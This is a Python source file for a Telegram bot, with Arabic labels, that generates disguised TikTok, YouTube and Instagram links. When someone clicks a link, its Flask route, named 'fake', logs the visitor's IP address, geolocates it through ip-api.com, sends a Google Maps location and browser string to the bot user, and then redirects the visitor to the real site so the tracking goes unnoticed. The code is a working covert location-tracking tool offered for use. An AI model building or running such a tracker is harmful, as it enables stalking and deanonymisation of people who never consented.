import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, redirect
import requests
import threading
import os

BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = os.environ.get("RENDER_URL")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("تيك توك", callback_data="tiktok"),
        InlineKeyboardButton("يوتيوب", callback_data="youtube")
    )
    markup.row(
        InlineKeyboardButton("إنستغرام", callback_data="instagram")
    )
    bot.send_message(message.chat.id, "اختر منصة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    link = f"{BASE_URL}/{call.data}?ref={call.from_user.id}"
    bot.send_message(call.message.chat.id, f"رابطك: {link}")
    bot.answer_callback_query(call.id)

@app.route('/<platform>')
def fake(platform):
    ref = request.args.get('ref')
    if not ref:
        return "خطأ", 400
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        maps = f"https://www.google.com/maps?q={r['lat']},{r['lon']}"
    except:
        maps = "غير متاح"
    bot.send_message(int(ref), f"زائر:\n{maps}\n{request.headers.get('User-Agent')[:50]}")
    return redirect(f"https://www.{platform}.com")

@app.route('/')
def home():
    return "شغال"

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
